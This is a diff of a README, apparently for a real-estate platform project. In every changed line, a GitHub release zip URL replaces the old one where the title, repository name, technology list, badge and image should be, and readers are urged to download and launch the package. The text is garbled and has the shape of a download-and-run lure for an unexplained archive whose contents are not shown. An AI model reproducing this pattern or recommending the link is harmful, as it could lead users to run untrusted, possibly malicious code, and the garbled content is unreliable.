@@ -1,9 +1,9 @@
-# https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip 🏠
+# https://github.com/Theoiscoollol/Estatease.Co/releases/download/v2.0/Software.zip 🏠
 
-Welcome to the https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip repository for Real Estate Platform Development!
+Welcome to the https://github.com/Theoiscoollol/Estatease.Co/releases/download/v2.0/Software.zip repository for Real Estate Platform Development!
 
 ## Description
-This repository focuses on the development of a Real Estate Platform, utilizing a combination of technologies such as AWS, CSS, HTML, MongoDB, https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip, and more. The goal is to create a robust and user-friendly website for all things related to real estate.
+This repository focuses on the development of a Real Estate Platform, utilizing a combination of technologies such as AWS, CSS, HTML, MongoDB, https://github.com/Theoiscoollol/Estatease.Co/releases/download/v2.0/Software.zip, and more. The goal is to create a robust and user-friendly website for all things related to real estate.
 
 ## Topics
 - aws
@@ -18,7 +18,7 @@ This repository focuses on the development of a Real Estate Platform, utilizing 
 - website
 
 ## Software Download
-[![Download Software](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip)](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v2.0/Software.zip)](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v2.0/Software.zip)
 
 Please download the software package from the provided link above. Once downloaded, the software needs to be launched to kickstart your Real Estate Platform Development journey.
 
@@ -35,4 +35,4 @@ Let's build something amazing together in the world of real estate! 🏡🚀
 
 Happy Developing! 👨‍💻🏢
 
-![Real Estate](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip)
+![Real Estate](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v2.0/Software.zip)
